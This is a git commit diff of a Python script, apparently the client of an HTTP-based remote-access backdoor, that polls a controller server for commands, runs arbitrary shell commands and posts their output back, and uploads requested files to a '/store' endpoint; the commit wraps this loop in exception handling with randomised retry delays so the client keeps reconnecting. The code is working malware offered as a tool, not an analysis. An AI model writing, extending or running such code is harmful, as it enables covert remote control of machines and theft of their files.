7dff2aa0c3164d4e2403d06b6ba5c9ff967bb01a
orkhan <orkhan.huseyn@outlook.com>
2018-03-01 00:18:52 -0800

    hadnlign exceptions on client side

--- http_client.py
+++ http_client.py
@@ -7,6 +7,7 @@ import time
 import os
 import shutil
 import winreg
+import random
 
 SERVER_URL = "http://127.0.0.1"
 
@@ -27,31 +28,46 @@ if not os.path.exists(destination):
     key.Close()
 
 
+# Connection function
+def connect():
+
+    while True:
+        req = requests.get(SERVER_URL)
+        command = req.text
+
+        if "terminate" in command:
+            return 1
+
+        elif "grab" in command:
+
+            grab, path = command.split("*")
+            if os.path.exists(path=path):
+                url = SERVER_URL + "/store"
+                files = {"file": open(path, "r")}
+                r = requests.post(url=url, files=files)
+            else:
+                post_response = requests.post(SERVER_URL, data="[-] Could not find the file")
+
+        else:
+            cmd = subprocess.Popen(command, shell=True,
+                                   stdin=subprocess.PIPE,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+
+            post_response = requests.post(url=SERVER_URL, data=cmd.stdout.read())
+            post_response = requests.post(url=SERVER_URL, data=cmd.stderr.read())
+
+        time.sleep(3)
+
+
 while True:
 
-    req = requests.get(SERVER_URL)
-    command = req.text
+    try:
+        if connect() == 1:
+            break
+    except:
+        sleep_for = random.randrange(1, 10)
+        time.sleep(sleep_for)
+        pass
 
-    if "terminate" in command:
-        break
 
-    elif "grab" in command:
-
-        grab, path = command.split("*")
-        if os.path.exists(path=path):
-            url = SERVER_URL + "/store"
-            files = {"file": open(path, "r")}
-            r = requests.post(url=url, files=files)
-        else:
-            post_response = requests.post(SERVER_URL, data="[-] Could not find the file")
-
-    else:
-        cmd = subprocess.Popen(command, shell=True,
-                               stdin=subprocess.PIPE,
-                               stdout=subprocess.PIPE,
-                               stderr=subprocess.PIPE)
-
-        post_response = requests.post(url=SERVER_URL, data=cmd.stdout.read())
-        post_response = requests.post(url=SERVER_URL, data=cmd.stderr.read())
-
-    time.sleep(3)
